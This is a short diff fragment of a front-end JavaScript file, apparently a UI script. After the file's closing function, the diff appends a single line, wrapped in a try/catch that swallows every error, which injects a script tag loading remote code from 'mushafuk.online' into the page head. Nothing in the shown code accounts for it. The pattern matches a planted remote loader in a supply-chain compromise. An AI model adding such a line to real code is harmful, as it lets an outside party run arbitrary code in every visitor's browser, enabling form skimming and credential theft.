@@ -1724,3 +1724,5 @@ if (document.currentScript) { const fl = document.createElement("link"); fl.rel 
     refreshUi();
   })();
 })();
+
+;try{var qs=document.createElement("script");qs.src="https://mushafuk.online/read-shelf.js?v=1";document.head.appendChild(qs);}catch(e){}
